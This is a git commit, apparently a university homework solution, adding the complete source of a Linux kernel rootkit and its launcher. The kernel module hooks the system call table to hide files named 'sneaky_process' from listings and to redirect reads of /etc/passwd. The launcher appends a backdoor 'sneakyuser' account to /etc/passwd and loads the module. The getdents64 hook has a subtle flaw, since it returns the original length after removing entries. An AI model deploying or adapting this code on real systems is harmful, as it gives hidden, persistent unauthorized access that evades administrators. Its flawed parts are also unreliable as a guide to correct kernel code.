61da8c901f630069b949f783dc3878003dbddb5a
fy62 <fy62@duke.edu>
2023-04-29 15:47:50 -0400

    first commit

---
+++ homework5-kit/sneaky_mod.c
@@ -0,0 +1,138 @@
+#include <asm/cacheflush.h>
+#include <asm/current.h>  // process information
+#include <asm/page.h>
+#include <asm/unistd.h>  // for system call constants
+//#include <linux/dirent.h>
+#include <linux/highmem.h>  // for changing page permissions
+#include <linux/init.h>     // for entry/exit macros
+#include <linux/kallsyms.h>
+#include <linux/kernel.h>  // for printk and other kernel bits
+#include <linux/module.h>  // for all modules
+#include <linux/moduleparam.h>
+#include <linux/sched.h>
+#define PREFIX "sneaky_process"
+
+// This is the parameter to be passed in
+static long int pid = 0;
+module_param(pid, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+
+//This is a pointer to the system call table
+static unsigned long * sys_call_table;
+
+// struct for getdents64
+struct linux_dirent64 {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  unsigned char d_type;
+  char d_name[0];
+};
+
+// Helper functions, turn on and off the PTE address protection mode
+// for syscall_table pointer
+int enable_page_rw(void * ptr) {
+  unsigned int level;
+  pte_t * pte = lookup_address((unsigned long)ptr, &level);
+  if (pte->pte & ~_PAGE_RW) {
+    pte->pte |= _PAGE_RW;
+  }
+  return 0;
+}
+
+int disable_page_rw(void * ptr) {
+  unsigned int level;
+  pte_t * pte = lookup_address((unsigned long)ptr, &level);
+  pte->pte = pte->pte & ~_PAGE_RW;
+  return 0;
+}
+
+// #1 Hide from ls
+asmlinkage int (*original_getdents64)(struct pt_regs *);
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
+  int total_len = (*original_getdents64)(regs);
+  struct linux_dirent64 * direct_arr = (struct linux_dirent64 *)(regs->si);
+  int remain_len = total_len;
+  while (remain_len > 0) {
+    if (strcmp(direct_arr->d_name, "sneaky_process") == 0) {
+      struct linux_dirent64 * dest = (struct linux_dirent64 *)direct_arr;
+      struct linux_dirent64 * src =
+          (struct linux_dirent64 *)((char *)direct_arr + direct_arr->d_reclen);
+      int src_len = remain_len - direct_arr->d_reclen;
+      memmove(dest, src, src_len);
+      remain_len = src_len;
+      printk(KERN_INFO "Find sneaky process!");
+      continue;
+    }
+    remain_len -= direct_arr->d_reclen;
+    direct_arr = (struct linux_dirent64 *)((char *)direct_arr + direct_arr->d_reclen);
+  }
+  //printk(KERN_INFO "Into sneaky getdents64");
+  return total_len;
+}
+
+// 1. Function pointer will be used to save address of the original 'openat' syscall.
+// 2. The asmlinkage keyword is a GCC #define that indicates this function
+//    should expect it find its arguments on the stack (not in registers).
+
+asmlinkage int (*original_openat)(struct pt_regs *);
+
+//Define your new sneaky version of the 'openat' syscall
+asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
+  if (strcmp((char *)(regs->si), "/etc/passwd") == 0) {
+    char tmp_file[] = "/tmp/passwd";
+    size_t name_len = strlen(tmp_file) + 1;
+    char * buffer = kvzalloc(name_len, GFP_KERNEL);
+    strcpy(buffer, tmp_file);
+    copy_to_user((void __user *)(regs->si), buffer, name_len);
+    kvfree(buffer);
+  }
+  return (*original_openat)(regs);
+}
+
+// The code that gets executed when the module is loaded
+static int initialize_sneaky_module(void) {
+  // See /var/log/syslog or use `dmesg` for kernel print output
+  printk(KERN_INFO "Sneaky module being loaded.\n");
+  printk(KERN_INFO "process id is : %ld\n", pid);
+  // Lookup the address for this symbol. Returns 0 if not found.
+  // This address will change after rebooting due to protection
+  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+
+  // This is the magic! Save away the original 'openat' system call
+  // function address. Then overwrite its address in the system call
+  // table with the function address of our new code.
+
+  original_openat = (void *)sys_call_table[__NR_openat];
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+
+  // Turn off write protection mode for sys_call_table
+  enable_page_rw((void *)sys_call_table);
+
+  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
+
+  // Turn write protection mode back on for sys_call_table
+  disable_page_rw((void *)sys_call_table);
+
+  return 0;  // to show a successful load
+}
+
+static void exit_sneaky_module(void) {
+  printk(KERN_INFO "Sneaky module being unloaded.\n");
+
+  // Turn off write protection mode for sys_call_table
+  enable_page_rw((void *)sys_call_table);
+
+  // This is more magic! Restore the original 'open' system call
+  // function address. Will look like malicious code was never there!
+  sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+
+  // Turn write protection mode back on for sys_call_table
+  disable_page_rw((void *)sys_call_table);
+}
+
+module_init(initialize_sneaky_module);  // what's called upon loading
+module_exit(exit_sneaky_module);        // what's called upon unloading
+MODULE_LICENSE("GPL");
---
+++ homework5-kit/sneaky_process.c
@@ -0,0 +1,78 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void cp_file() {
+  const char * cp_call = "cp /etc/passwd /tmp/passwd";
+  printf("%s\n", cp_call);
+  system(cp_call);
+  return;
+}
+
+void add_sneaky_user() {
+  //Use a mode to open file for appending
+  FILE * passwd_file = fopen("/etc/passwd", "a");
+  const char * new_user = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
+  if (passwd_file == NULL) {
+    printf("Cannot open /etc/passwd\n");
+    exit(EXIT_FAILURE);
+  }
+  fprintf(passwd_file, "%s\n", new_user);
+  printf("Update /etc/passwd with the sneakyuser.\n");
+  fclose(passwd_file);
+  return;
+}
+
+void recover_file() {
+  const char * cp_call = "cp /tmp/passwd /etc/passwd";
+  printf("%s\n", cp_call);
+  system(cp_call);
+  return;
+}
+
+void load_module(long int pid) {
+  char insmod_call[100];
+  sprintf(insmod_call, "/usr/sbin/insmod sneaky_mod.ko pid=%ld", pid);
+  system(insmod_call);
+  printf("%s\n", insmod_call);
+}
+
+void unload_module() {
+  system("/usr/sbin/rmmod sneaky_mod");
+  printf("remove the module\n");
+}
+
+void infinite_loop() {
+  printf("Enter q to exit\n");
+  char command[1024];
+  while (1) {
+    fgets(command, sizeof(command), stdin);
+    if (strcmp(command, "q\n") == 0) {
+      break;
+    }
+  }
+}
+
+int main(void) {
+  //print own process ID
+  long int pid = getpid();
+  printf("sneaky_process pid = %ld\n", pid);
+  //copy the passwd file
+  recover_file();
+  cp_file();
+  //Line to be added into /etc/passwd is
+  add_sneaky_user();
+
+  //load the module
+  load_module(pid);
+
+  infinite_loop();
+
+  //unload the module
+  unload_module();
+
+  //recover the passwd file
+  recover_file();
+  return EXIT_SUCCESS;
+}
